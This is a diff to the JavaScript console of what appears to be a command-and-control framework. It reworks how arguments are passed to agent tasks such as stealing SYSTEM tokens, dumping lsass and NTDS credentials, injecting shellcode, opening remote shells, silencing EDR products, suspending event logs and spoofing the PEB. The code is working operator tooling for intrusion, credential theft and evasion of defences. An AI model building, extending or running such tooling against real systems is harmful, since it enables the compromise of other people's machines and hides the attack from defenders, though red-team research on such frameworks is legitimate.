@@ -3860,7 +3860,7 @@ async function runCtxAction(act) {
         }
       } else if (privAct === 'steal-system') {
         // Steal token from System (PID 4) — always works if SYSTEM
-        const r = await api('POST', `/api/agents/${aid}/task`, {type:'TOKEN_STEAL', args:'4'});
+        const r = await api('POST', `/api/agents/${aid}/task`, {type:'TOKEN_STEAL', args:'{"pid":4}'});
         if (r?.ok) {
           toast('TOKEN_STEAL → PID 4 (System)');
           if (!activeAgent || activeAgent.id !== aid) openConsoleFor(aid);
@@ -3871,7 +3871,7 @@ async function runCtxAction(act) {
           {key:'pid', label:'Target PID (run ps first)', def:'', ph:'664'},
         ], async vals => {
           if (!vals.pid) return;
-          const r = await api('POST', `/api/agents/${aid}/task`, {type:'TOKEN_STEAL', args:vals.pid});
+          const r = await api('POST', `/api/agents/${aid}/task`, {type:'TOKEN_STEAL', args:JSON.stringify({pid:parseInt(vals.pid,10)})});
           if (r?.ok) {
             toast(`TOKEN_STEAL → PID ${vals.pid}`);
             openConsoleFor(aid);
@@ -4436,7 +4436,7 @@ function agentContextMenu(e, agentId) {
       {label:'ℹ️  Sysinfo',           action:{fn:'selectAndTask', id, type:'SYSINFO',       args:''}},
       {label:'📋  Process List',      action:{fn:'openProcessList', id}},
       {label:'🔑  Whoami / Token',     action:{fn:'selectAndTask', id, type:'TOKEN_WHOAMI',  args:''}},
-      ...(isWin ? [{label:'💾  Dump lsass',         action:{fn:'selectAndTask', id, type:'MINIDUMP',    args:''}}] : []),
+      ...(isWin ? [{label:'💾  Dump lsass',         action:{fn:'selectAndTask', id, type:'MINIDUMP',    args:'{}'}}] : []),
     ]},
     {_sub:'🔍  Port Scan', items:[
       {label:'Top 100 ports',    action:{fn:'portScan', id, target:a.ip, ports:'21,22,23,25,53,80,88,110,135,139,143,389,443,445,464,593,636,993,995,1433,3268,3306,3389,5985,8080,8443', ms:'300', label:'Top100'}},
@@ -4593,8 +4593,8 @@ function processContextMenu(e, pid, name) {
     {_header: label},
     {label:'💉  Inject shellcode',  action:{fn:'injectModal', id:aid, mode:'remote', pid:String(pid)}},
     {label:'⚡  Inject APC',        action:{fn:'injectModal', id:aid, mode:'apc',    pid:String(pid)}},
-    {label:'🪙  Steal Token',       action:{fn:'selectAndTask', id:aid, type:'TOKEN_STEAL', args:String(pid)}},
-    {label:'💾  Minidump',          action:{fn:'selectAndTask', id:aid, type:'MINIDUMP',    args:String(pid)}},
+    {label:'🪙  Steal Token',       action:{fn:'selectAndTask', id:aid, type:'TOKEN_STEAL', args:JSON.stringify({pid:pid})}},
+    {label:'💾  Minidump',          action:{fn:'selectAndTask', id:aid, type:'MINIDUMP',    args:JSON.stringify({pid:pid})}},
     null,
     {label:'🔍  Port Scan (local)', action:{fn:'portScan', id:aid, target:'127.0.0.1', ports:'1-1024', ms:'200', label:'Local'}},
     null,
@@ -9870,7 +9870,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       }
       const kind = (sub === 'ps' || sub === 'powershell') ? 'ps' : 'cmd';
       // Send ISHELL_OPEN, then on result enter ishell mode
-      const r2 = await api('POST', `/api/agents/${agentID}/task`, {type:'ISHELL_OPEN', args: kind});
+      const r2 = await api('POST', `/api/agents/${agentID}/task`, {type:'ISHELL_OPEN', args: JSON.stringify({shell: kind})});
       if (r2?.ok && r2.data?.task_id) {
         addConsoleOutput(`[*] opening ${kind === 'ps' ? 'PowerShell' : 'CMD'} shell on agent…`, '', null);
         pollResultCb(r2.data.task_id, agentID, () => ishellActivate(agentID, kind));
@@ -9893,7 +9893,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
     }
     case 'token': {
       const [sub3, ...rest4] = args.split(' ');
-      if (sub3 === 'steal') { taskType='TOKEN_STEAL'; taskArgs=rest4[0]; }
+      if (sub3 === 'steal') { taskType='TOKEN_STEAL'; taskArgs=rest4[0]?.startsWith('{') ? rest4[0] : JSON.stringify({pid:parseInt(rest4[0],10)}); }
       else if (sub3 === 'make') { taskType='TOKEN_MAKE'; taskArgs=rest4.join(' '); }
       else if (sub3 === 'drop') { taskType='TOKEN_DROP'; }
       else { taskType='TOKEN_WHOAMI'; }
@@ -9919,7 +9919,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
       break;
     }
     case 'download': taskType='DOWNLOAD'; taskArgs=JSON.stringify({path:args}); break;
-    case 'minidump': taskType='MINIDUMP'; taskArgs=args; break;
+    case 'minidump': taskType='MINIDUMP'; taskArgs=args ? (args.startsWith('{') ? args : JSON.stringify({pid:parseInt(args,10)})) : '{}'; break;
     case 'port-scan': taskType='PORT_SCAN'; taskArgs=args; break;
 
     // ── Lateral movement ───────────────────────────────────────────────────
@@ -10471,11 +10471,11 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
     }
 
     // ── L3 commands ────────────────────────────────────────────────────────
-    case 'edr-silence': taskType='EDR_SILENCE'; taskArgs=args; break;
-    case 'edr-silence-rm': taskType='EDR_SILENCE_RM'; taskArgs=args; break;
+    case 'edr-silence': taskType='EDR_SILENCE'; taskArgs=args?.startsWith('{') ? args : JSON.stringify({pid:parseInt(args,10)}); break;
+    case 'edr-silence-rm': taskType='EDR_SILENCE_RM'; taskArgs=args?.startsWith('{') ? args : JSON.stringify({pid:parseInt(args,10)}); break;
     case 'eventlog-suspend': taskType='EVENTLOG_SUSPEND'; break;
     case 'eventlog-resume': taskType='EVENTLOG_RESUME'; break;
-    case 'peb-spoof': taskType='PEB_SPOOF'; taskArgs=args; break;
+    case 'peb-spoof': taskType='PEB_SPOOF'; taskArgs=JSON.stringify({path:args}); break;
     case 'hwbp-clear': taskType='HWBP_CLEAR'; break;
     case 'ntds-dump': taskType='NTDS_DUMP'; taskArgs=args; break;
     case 'elevate': {
